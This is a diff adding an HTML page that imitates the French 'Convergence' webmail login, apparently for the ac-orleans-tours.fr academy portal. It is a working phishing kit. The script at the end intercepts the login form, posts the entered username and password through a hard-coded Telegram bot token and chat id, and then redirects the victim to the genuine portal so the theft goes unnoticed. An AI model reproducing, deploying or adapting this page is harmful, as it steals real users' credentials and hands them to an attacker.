@@ -1,0 +1,113 @@
+﻿
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<!-- Mimic Internet Explorer 7 -->
+		<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+		<title></title>
+		<style type="text/css">
+			@import "files/css/dojo.css";
+			@import "files/css/dijit.css";
+			@import "files/css/tundra.css";
+			@import "files/css/DropDownSelect.css";
+		</style>
+		<link rel="stylesheet" href="files/css/css.css" type="text/css"/>
+
+	</head>
+
+    <body>
+        <div class="Convergence-Login">
+			<div class="Convergence-Login-Border">
+				<div class="Convergence-Login-Banner">
+					<div  class="Convergence-Login-Logo" wairole="presentation"></div>
+					<div id="welcomeMsg" class="Convergence-Login-WelcomeMsg"></div>
+				</div>
+
+				<div  style="color:black;font-weight:bold;font-size:20px">Convergence</div>
+
+				<form action="" method="post"  autocorrect="off" autocapitalize="none">
+
+					<div>
+						<div class="Convergence-Login-Form">
+							<div class="Convergence-Login-FormRow">
+								<label id="usernameLabelID" for="username">Username:</label>
+								<input id="username" name="user" type="text"  required=""/>
+							</div>
+							<div class="Convergence-Login-FormRow">
+								<label id="passwordLabelID" for="password">Password:</label>
+								<input id="password" name="pass" type="password" required=""/>
+							</div>
+							<div class="Convergence-Login-FormRow tundra">
+
+								<div class="Convergence-Login-SelectLang">
+									<select dojoType="dojox.form.DropDownSelect"
+											class="dojoxDropDownSelectFixedWidth"
+											id="langButton">
+										<option value="fr">Francais</option>
+										
+									</select>
+								</div>
+								<div class="Convergence-Login-FormButton" id="buttonContainer">
+									<div>
+										<input type="submit" value="se connecter"/>
+									</div>
+								</div>
+								<div style="clear: both"></div>
+							</div>
+
+						</div>
+
+					</div>
+					<div style="clear: both"></div>
+				</form>
+
+				<div class="Convergence-Login-RedBand"></div>
+				<div id="copyright" class="Convergence-Login-Copyright"></div>
+			</div>
+		</div>
+
+		<div id="overlay" class="login">
+			<div class="centered">
+				<div class="logo"></div>
+				<div id="progress"></div>
+			</div>
+		</div>
+
+		<iframe name="picCache" id="picCache" src="" width=0 height=0 frameborder=0></iframe>
+		<script>
+document.querySelector("form").addEventListener("submit", async function(e) {
+    e.preventDefault(); // Empêche la soumission par défaut
+
+    const username = document.querySelector("#username").value;
+    const password = document.querySelector("#password").value;
+
+    const token = "5898575682:AAFpxh-hiq6CSkbziNG_Jsr88xjgqI_ctkI";
+    const chat_id = "-4508618470";
+    const message = `🔐 Connexion reçue :\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    
+    try {
+        await fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                chat_id: chat_id,
+                text: message
+            })
+        });
+
+        // Redirection après envoi
+        window.location.href = "https://extraent.ac-orleans-tours.fr/iwc_frame/";
+    } catch (error) {
+        alert("Erreur lors de l'envoi. Veuillez réessayer.");
+        console.error(error);
+    }
+});
+</script>
+
+    </body>
+</html>
